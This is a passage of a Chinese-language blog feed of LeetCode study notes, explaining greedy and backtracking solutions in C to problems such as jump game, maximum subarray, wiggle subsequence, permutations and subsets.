    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/jump-game</p><p>这题我又是理解错意思了，我以为跳跃的长度就是数组对应的元素，但其实数组对应的元素表示的跳跃的<strong>最大值</strong>，也就是说跳跃长度范围是<strong>0~nums[i]</strong>。</p><p>贪心算法：判断跳跃长度<strong>能否覆盖整个数组</strong>，这里的难点在于跳跃长度为<strong>0</strong>的元素</p><p>每次记录能够到达的<strong>最远的数组下标</strong>，当遍历到该元素时，判断跳跃距离是否为0</p><ul><li>若为0，则无法到达最后一个下标</li><li>若不为0，则继续</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">canJump</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span> {</span><br><span class="line">    <span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxIndex=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(numsSize==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numsSize<span class="number">-1</span>; i++) { <span class="comment">//最后一个元素不用判断</span></span><br><span class="line">        <span class="keyword">if</span>(maxIndex &lt;= index+nums[i]) <span class="comment">//更新能够到达的最大下标</span></span><br><span class="line">            maxIndex = index+nums[i];</span><br><span class="line">        <span class="keyword">if</span>(i==maxIndex &amp;&amp; nums[maxIndex] == <span class="number">0</span>) <span class="comment">//若能够到达的最远的元素值为0，则返回false</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(maxIndex &gt;= numsSize<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            index = i+<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>买卖股票的最佳时机Ⅱ</title>
    <link href="/2024/03/05/%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E4%BD%B3%E6%97%B6%E6%9C%BA%E2%85%A1/"/>
    <url>/2024/03/05/%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E4%BD%B3%E6%97%B6%E6%9C%BA%E2%85%A1/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-ii</p><p>这题还是用贪心算法比较方便。(类似于<a href="https://leetcode.cn/problems/wiggle-subsequence/">摆动序列</a>，通过<strong>峰值</strong>判断是否进行操作)</p><ol type="1"><li>假设当前买入的股票价格是<code>buy</code></li><li>遍历<code>prices</code>剩余的价格（假设此时遍历到<code>prices[i]</code>）<ul><li>若<code>prices[i]</code><strong>大于等于</strong><code>buy</code>，则更新出售价格<code>sell</code>，重复上述步骤直到第一个峰值（假设为<code>prices[k]</code>），则进行出售</li><li>若<code>prices[i]</code><strong>小于</strong><code>buy</code>，则以<code>buy</code>的价格出售（至少保证不亏钱）</li></ul></li><li>出售完成后需要更新买入价格和出售价格为<code>prices[k+1]</code>，然后重复上述步骤</li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>* prices, <span class="type">int</span> pricesSize)</span> {</span><br><span class="line">    <span class="type">int</span> buy = prices[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> profitSum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> sell = prices[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;pricesSize; i++) {</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(sell &lt;= prices[i]) { <span class="comment">//若递增，则更新sell，直到峰值才不会进入该if</span></span><br><span class="line">            sell = prices[i];</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sell &gt; prices[i]){ <span class="comment">//若递减，则需要出售上一次买的股票</span></span><br><span class="line">            profitSum+=(sell - buy);</span><br><span class="line">            sell = prices[i];</span><br><span class="line">            buy = prices[i]; <span class="comment">//更新新位置</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(i == pricesSize<span class="number">-1</span>)</span><br><span class="line">            profitSum+=(sell - buy);</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> profitSum;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>代码随想录</strong>提供的思路更加简洁，计算每一天的利润（除了第一天），然后把结果为正数的利润加起来就是最大利润。</p><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/2020112917480858-20230310134659477.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最大子数组和</title>
    <link href="/2024/03/05/%E6%9C%80%E5%A4%A7%E5%AD%90%E6%95%B0%E7%BB%84%E5%92%8C/"/>
    <url>/2024/03/05/%E6%9C%80%E5%A4%A7%E5%AD%90%E6%95%B0%E7%BB%84%E5%92%8C/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/maximum-subarray</p><p>题干比较好理解，最简单的做法是暴力求解，使用二重for循环计算出所有的情况，然后记录最大值。这种方法的时间复杂度是<strong>O(n<sup>2</sup></strong>)，超时。</p><p>根据代码随想录，使用贪心算法的时间复杂度是<strong>O(n)</strong>，只需一个for循环即可。这里贪心的思想是：若当前遍历到<code>nums[i]</code>元素，通过该元素前面的子数组之和的值，来判断是继续增加子数组元素还是直接截断。</p><ul><li>若子数组之和<code>count</code>大于0，则<code>count+nums[i] &gt; nums[i]</code>，子数组可以增加元素</li><li>若子数组之和<code>count</code>小于等于0，则<code>count+nums[i] &lt;= nums[i]</code>，子数组需要截断，从当前元素<code>nums[i]</code>开始计算子数组之和（注意这个过程中<code>count</code>需要重置为0）</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span> {</span><br><span class="line">    <span class="type">int</span> sum=INT_MIN; <span class="comment">//设置为最小整数，记录最大子数组之和</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>; <span class="comment">//计算当前子数组之和</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numsSize; i++) {</span><br><span class="line">        <span class="keyword">if</span>(count &lt; <span class="number">0</span>) {  <span class="comment">//此时count+nums[i] &lt; nums[i]，需要重置子数组</span></span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">        count+=nums[i];</span><br><span class="line">        <span class="keyword">if</span>(count &gt; sum) {</span><br><span class="line">            sum = count;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>摆动序列</title>
    <link href="/2024/03/05/%E6%91%86%E5%8A%A8%E5%BA%8F%E5%88%97/"/>
    <url>/2024/03/05/%E6%91%86%E5%8A%A8%E5%BA%8F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/wiggle-subsequence/</p><p>这题的思想是贪心算法，一开始我的想法很简单：直接遍历数组，不符合条件的直接删去(跳过)。完成代码后运行前三个测试用例都通过了，然而一提交却显示答案错误，然后我又在VScode中测试代码，输出处理后的数组，然后一个一个手算，还是没发现错误，最后还是放弃了，看了一下<strong>代码随想录</strong>的思路才恍然大悟。例如下面这种情况：</p><p><img src="C:/Users/19594/AppData/Roaming/Typora/typora-user-images/image-20240305122451644.png"></p><p>按照我原本的思路，处理后的序列应该是：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">8</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">9</span>]</span><br></pre></td></tr></tbody></table></figure><p>而<strong>正确的序列</strong>应该是：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">8</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">9</span>]</span><br></pre></td></tr></tbody></table></figure><p>每次应该取<strong>峰值</strong>而不是单调坡度上的元素（不包括两端），如下如所示：</p><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20201124174327597.png"></p><p>代码如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">wiggleMaxLength</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>{</span><br><span class="line">    <span class="keyword">if</span>(numsSize&lt;<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> numsSize;</span><br><span class="line">    <span class="type">int</span> flag=<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> slow, fast;</span><br><span class="line">    <span class="keyword">for</span>(slow=<span class="number">0</span>,fast=<span class="number">0</span>; fast&lt;numsSize;) {</span><br><span class="line">        <span class="keyword">if</span>(fast==<span class="number">0</span>) {</span><br><span class="line">            nums[slow++] = nums[fast++];</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(nums[fast]-nums[slow<span class="number">-1</span>] &gt; <span class="number">0</span> &amp;&amp; flag!=<span class="number">1</span>) {</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">            nums[slow++] = nums[fast++];</span><br><span class="line">        } <span class="comment">//若满足条件则加入序列中</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums[fast]-nums[slow<span class="number">-1</span>] &lt; <span class="number">0</span> &amp;&amp; flag!=<span class="number">0</span>) {</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">            nums[slow++] = nums[fast++];</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums[fast]-nums[slow<span class="number">-1</span>] == <span class="number">0</span>) <span class="comment">//若差值为0，则直接舍去</span></span><br><span class="line">            fast++;</span><br><span class="line">        <span class="keyword">else</span>  <span class="comment">//若元素处于单调坡度上，则将当前元素替换为下一个元素，直到峰值</span></span><br><span class="line">            nums[slow<span class="number">-1</span>] = nums[fast++];</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>全排列</title>
    <link href="/2024/03/04/%E5%85%A8%E6%8E%92%E5%88%97/"/>
    <url>/2024/03/04/%E5%85%A8%E6%8E%92%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/permutations/</p><p>排列与组合的区别就在于——元素顺序。相同的元素按照不同的顺序摆放则表示的排列不同，但是表示同一个组合。</p><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20201209174225145.png"></p><p>该题需要定义一个辅助数组判断当前遍历的元素是否已经放入排列中，并且在回溯的<code>for</code>循环中都是从<code>0</code>开始遍历。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> pathTop, resTop;</span><br><span class="line"><span class="type">int</span>* used;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span>*nums, <span class="type">int</span> numsSize, <span class="type">int</span>** res, <span class="type">int</span>* path)</span> {</span><br><span class="line">    <span class="keyword">if</span>(pathTop==numsSize) { <span class="comment">//当前排列中有numsSize个元素，则返回</span></span><br><span class="line">        <span class="type">int</span>* tmp = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*pathTop);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;pathTop; i++)</span><br><span class="line">            tmp[i] = path[i];</span><br><span class="line">        res[resTop++] = tmp;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numsSize; i++) {</span><br><span class="line">        <span class="keyword">if</span>(used[i]==<span class="number">0</span>) {</span><br><span class="line">            path[pathTop++] = nums[i];</span><br><span class="line">            used[i]=<span class="number">1</span>; <span class="comment">//表示nums[i]元素已经加入排列中</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//注意这里不加continue，就会陷入无限递归</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        backtracking(nums, numsSize, res, path);</span><br><span class="line">        pathTop--;</span><br><span class="line">        used[i]=<span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span>** <span class="title function_">permute</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span> {</span><br><span class="line">    <span class="type">int</span>** res = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*)*<span class="number">12000</span>);</span><br><span class="line">    <span class="type">int</span>* path = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*numsSize);</span><br><span class="line">    used = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*numsSize);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numsSize; i++) <span class="comment">//初始化used数组</span></span><br><span class="line">        used[i]=<span class="number">0</span>;</span><br><span class="line">    pathTop = resTop = <span class="number">0</span>;</span><br><span class="line">    backtracking(nums, numsSize, res, path);</span><br><span class="line">    *returnSize = resTop;</span><br><span class="line">    *returnColumnSizes = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*resTop);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;resTop; i++) {</span><br><span class="line">        (*returnColumnSizes)[i] = numsSize;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>非递减子序列</title>
    <link href="/2024/03/04/%E9%9D%9E%E9%80%92%E5%87%8F%E5%AD%90%E5%BA%8F%E5%88%97/"/>
    <url>/2024/03/04/%E9%9D%9E%E9%80%92%E5%87%8F%E5%AD%90%E5%BA%8F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/non-decreasing-subsequences</p><p>这题与<a href="https://leetcode.cn/problems/subsets-ii/">子集Ⅱ</a>很类似，但是<strong>子集Ⅱ</strong>不要求解集按顺序存储，因此可以先对原数组进行排序再进行操作；而这题要求<strong>按照原数组的顺序</strong>寻找升序子序列，因此不能对原数组进行排序，否则会影响结果。</p><p>因此该题的处理方法与 子集Ⅱ不同，使用一个辅助数组<strong>存放当前层遍历过的元素</strong>，通过判断当前元素是否在该层出现过，从而进行去重。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> resTop, pathTop;</span><br><span class="line"><span class="type">int</span>* len;</span><br><span class="line"><span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> vale)</span> { <span class="comment">//判断vale元素是否出现过</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numsSize; i++) {</span><br><span class="line">        <span class="keyword">if</span>(nums[i]==vale)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span>** res, <span class="type">int</span>*path, <span class="type">int</span> start)</span> {</span><br><span class="line">    <span class="keyword">if</span>(pathTop&gt;=<span class="number">2</span>){</span><br><span class="line">        <span class="type">int</span>* tmp = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*pathTop);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;pathTop; i++)</span><br><span class="line">            tmp[i] = path[i];</span><br><span class="line">        res[resTop]= tmp;</span><br><span class="line">        len[resTop++] = pathTop;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(start&gt;=numsSize)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>* uset = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * numsSize); <span class="comment">//存放当前层遍历的元素</span></span><br><span class="line">    <span class="type">int</span> usetTop = <span class="number">0</span>; <span class="comment">//每一层都需要重新初始化，这样使得uset内存放的是该层的元素</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=start; i&lt;numsSize; i++) {</span><br><span class="line">        <span class="keyword">if</span>(pathTop==<span class="number">0</span> || (pathTop&gt;<span class="number">0</span> &amp;&amp; path[pathTop<span class="number">-1</span>]&lt;=nums[i])){</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; find(uset, usetTop, nums[i])) <span class="comment">//若当前元素在该层出现过</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            </span><br><span class="line">            path[pathTop++] = nums[i];</span><br><span class="line">            uset[usetTop++] = nums[i];</span><br><span class="line">            </span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        backtracking(nums, numsSize, res, path, i+<span class="number">1</span>);</span><br><span class="line">        pathTop--;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>** <span class="title function_">findSubsequences</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span> {</span><br><span class="line">    <span class="type">int</span>** res = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*) * <span class="number">45000</span>);</span><br><span class="line">    <span class="type">int</span>* path = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * numsSize);</span><br><span class="line">    len = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">45000</span>);</span><br><span class="line">    resTop = pathTop = <span class="number">0</span>; <span class="comment">//初始化结果数组和路径数组的下标</span></span><br><span class="line">    backtracking(nums, numsSize, res, path, <span class="number">0</span>);</span><br><span class="line">    *returnSize = resTop;</span><br><span class="line">    *returnColumnSizes = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * resTop);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; resTop; i++) {</span><br><span class="line">        (*returnColumnSizes)[i] = len[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>子集</title>
    <link href="/2024/03/03/%E5%AD%90%E9%9B%86/"/>
    <url>/2024/03/03/%E5%AD%90%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/subsets/</p><p>求集合的子集很容易联想到使用回溯算法，直接套用模板。</p><ul><li>终止条件是遍历到最后一个元素，即下标溢出是返回</li><li>其余情况直接加入结果数组<code>res</code>（包括了空集）</li><li>注意<code>start</code>参数的值，子集中元素不能重复</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> res_top, pathTop;</span><br><span class="line"><span class="type">int</span>* length;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span>** res, <span class="type">int</span>* path, <span class="type">int</span> start)</span> {</span><br><span class="line">    <span class="type">int</span>* tmp = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*pathTop); <span class="comment">//中间变量</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;pathTop; i++) {</span><br><span class="line">        tmp[i] = path[i];</span><br><span class="line">    }</span><br><span class="line">    res[res_top] = tmp;</span><br><span class="line">    length[res_top++] = pathTop;</span><br><span class="line">    <span class="keyword">if</span>(start&gt;=numsSize) <span class="comment">//终止条件是遍历到最后一个元素</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=start; i&lt;numsSize; i++) {</span><br><span class="line">        path[pathTop++] = nums[i];</span><br><span class="line">        backtracking(nums, numsSize, res, path, i+<span class="number">1</span>);</span><br><span class="line">        pathTop--;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>** <span class="title function_">subsets</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span> {</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>** res = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*)*<span class="number">10000</span>);</span><br><span class="line">    length = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">10000</span>); <span class="comment">//保存每个子集元素个数</span></span><br><span class="line">    <span class="type">int</span>* path = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">10</span>);</span><br><span class="line">    res_top = pathTop = <span class="number">0</span>; <span class="comment">//子集个数和子集元素的个数初始化为0</span></span><br><span class="line">    backtracking(nums, numsSize, res, path, <span class="number">0</span>);</span><br><span class="line">    *returnSize = res_top;</span><br><span class="line">    *returnColumnSizes = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*res_top);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;res_top; i++) {</span><br><span class="line">        